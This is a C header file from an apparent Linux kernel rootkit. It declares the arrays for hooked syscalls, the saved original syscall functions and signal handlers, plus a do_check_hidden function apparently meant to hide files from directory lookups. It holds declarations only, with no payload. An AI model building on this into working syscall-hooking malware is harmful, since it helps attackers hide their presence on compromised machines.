#ifndef _ROOTKIT_SYSCALL_HOOKS_H_
#define _ROOTKIT_SYSCALL_HOOKS_H_

#include "hooked_syscalls.h"
#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"
#include <asm/unistd.h>

#ifndef HOOKED_SYSCALLS
#define HOOKED_SYSCALLS
#endif

#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name for the signal handler array */

#define AT_LOOKUP_PARENTS 0x10000000 // Lookup only parent directories

// Array of the original syscall function references.
extern sysfun_t P_ORIG_SYSFUNS[__NR_syscalls];

// Array of the syscall hooks.
extern hook_t P_SYSCALL_HOOKS[];

// Array of the signal handlers.
extern const signal_handler_t P_SIG_HANDLERS[];

DECLARE_HOOK_HANDLERS(HOOKED_SYSCALLS)

long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                     const char __user *const s_filename, const int i32_at_flags);

#endif
